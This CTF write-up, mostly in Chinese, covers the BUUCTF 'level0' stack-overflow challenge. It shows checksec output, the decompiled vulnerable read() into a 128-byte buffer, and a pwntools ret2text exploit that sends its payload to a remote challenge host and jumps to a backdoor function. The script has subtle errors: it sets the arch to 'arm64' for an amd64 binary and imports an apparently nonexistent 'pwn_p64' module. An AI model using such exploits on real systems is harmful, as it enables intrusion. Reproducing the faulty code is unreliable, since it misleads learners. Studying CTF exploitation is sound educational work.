1. checksec

   ```
   ┌──(root㉿MiWiFi-RB03-srv)-[/home/kali/Desktop]
   └─# checksec level0
   [*] '/home/kali/Desktop/level0'
       Arch:     amd64-64-little
       RELRO:    No RELRO
       Stack:    No canary found
       NX:       NX enabled
       PIE:      No PIE (0x400000)
   ```

   64位，仅开启了栈不可执行保护
2. IDA分析

   ```
   ssize_t vulnerable_function()
   {
     char buf[128]; // [rsp+0h] [rbp-80h] BYREF
     return read(0, buf, 0x200uLL);
   }
   ```

   明显栈溢出0x180字节，有后门函数
3. exp

   ```python
   from pwn import *
   from pwn_p64 import *

   context(arch="arm64",log_level="debug",os='linux')
   io = remote("node4.buuoj.cn", 26194)
   payload = b'a' * 0x80 + b'a' * 8 + b'\x96\x05\x40\x00\x00\x00\x00\x00'
   io.sendafter(b"Hello, World\n", payload)
   io.interactive()
   ```
